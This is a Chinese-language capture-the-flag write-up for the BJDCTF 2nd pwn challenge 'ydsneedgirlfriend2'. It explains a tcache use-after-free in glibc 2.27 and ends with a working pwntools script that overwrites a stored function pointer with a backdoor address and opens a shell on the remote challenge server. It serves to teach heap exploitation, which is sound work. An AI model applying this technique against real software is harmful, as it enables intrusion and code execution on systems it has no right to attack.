---
title: "BJDCTF 2nd Pwn Ydsneedgirlfriend2"
date: 2020-03-24T21:47:54+08:00
author: NiceSeven
categories:
  - BJDCTF 2nd
tags:
  - Pwn
---

# BJDCTF 2nd Pwn Ydsneedgirlfriend2

考点：tcache UAF堆利用

环境：ubuntu18.0.4，libc-2.27

![image-20200324215344007](/images/image-20200324215344007.png)

![image-20200324220241515](/images/image-20200324220241515.png)

![image-20200324220010996](/images/image-20200324220010996.png)

增加、删除、查看，存在个atoi()或许可以改got执行system

![image-20200324220648552](/images/image-20200324220648552.png)

在malloc我们给定的length之前会malloc(0x10)把返回的指针存在girlfriends[]数组中，然后malloc我们给出的chunk把返回的指针存在前面的哪个0x10的chunk中，注意这里的v0的类型(viod **v0)，这里把![image-20200324224151820](/images/image-20200324224151820.png)是把print_girlfriend_name这个函数指针存在了malloc(0x10)的chunk中

![image-20200324221703983](/images/image-20200324221703983.png)

dele函数，这里大概的意思先把指针指向chunk数据的释放，然后在把这个存指针的这个chunk释放，但free的指针未清零，构成UAF的条件

![image-20200324224417285](/images/image-20200324224417285.png)

show函数中箭头实际是执行，在add函数中存在0x10chunk中的print_girlfriend_name函数，回顾c语言知识函数本质也是个指针

先add3个32字节的chunk看看内存情况

![image-20200324222341403](/images/image-20200324222341403.png)

![image-20200324222519179](/images/image-20200324222519179.png)

最开始malloc(0x10)的chunk第1个8字节(0x6032e0)存的是指向最后add的chunk的数据部分的指针，第2个8字节(0x4009ab)存的是个指向print_girlfriend_name函数的指针，回顾上面show函数的代码如果我们调用show就相当于调用这个20字节的chunk中第2个8字节指向的函数，那么利用思路就是根据libc2.26之后的tcachebin的分配规则与fastbin类似，我们free的最后一个chunk，在下次malloc时就是把这个chunk重新分配给用户，但是这个free这个chunk的时候里面存的指向函数的指针并不会置空造成野指针(UAF)，我们想办法把这里的指针改为backdoor地址，也就是把图中0x4009ab改为backdoor的地址0x400d86

![image-20200324225736625](/images/image-20200324225736625.png)

我们先add函数创建1个chunk，实际上创建了2个chunk分别是malloc(0x10)和malloc(length)详见add函数代码，再删除第1个chunk也就是序号为0的chunk，看看内存情况

![image-20200324235055616](/images/image-20200324235055616.png)

通过观察我们猜测在堆开始的地址offset 50处存的是tcache结构

![image-20200325000814706](/images/image-20200325000814706.png)

![image-20200325000714682](/images/image-20200325000714682.png)

可以发现dele只删除了8字节的数据，还残留了2个a，因为根据tcache分配规则我们free了0这时候我在add一个16字节的chunk也就会把之前free的序号为0的malloc(0x10)分配给我们，填入8个c然后填入backdoor地址就可以覆盖print_girlfriend_name(0x4009ab)函数的指针为backdoor的指针，然后我们再调用show函数查看我们后add的那个16字节的chunk因为是重新申请的所以序号还是0，就能调用存在0x1ea9260+0x8处的backdoor函数了

![image-20200325001456947](/images/image-20200325001456947.png)

因为又add了0x10的chunk，所以tcache结构中指向malloc(0x10)的指针不见了，返回给用户了

![image-20200325001755448](/images/image-20200325001755448.png)

![image-20200324235617524](/images/image-20200324235617524.png)

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *

#sh = process('./ydsneedgirlfriend2')
elf = ELF('./ydsneedgirlfriend2')
sh = remote('node3.buuoj.cn',26579)

def add(size,name):
    sh.recvuntil(':')
    sh.sendline('1')
    sh.recvuntil('name:')
    sh.sendline(str(size))
    sh.recvuntil('name:')
    sh.sendline(name)

def dele(idx):
    sh.recvuntil(':')
    sh.sendline('2')
    sh.recvuntil(':')
    sh.sendline(str(idx))

def show(idx):
    sh.recvuntil(':')
    sh.sendline('3')
    sh.recvuntil(':')
    sh.sendline(str(idx))

backdoor = 0x400d86
add(30,'aaaaaaaaaa')
#add(30,'bbbbbbbbbb')
dele(0)
#gdb.attach(sh)
#dele(1)
add(16,'cccccccc'+p64(backdoor))
#gdb.attach(sh)
show(0)
sh.interactive()
```

![image-20200324231554296](/images/image-20200324231554296.png)

总结：堆题要多动态分析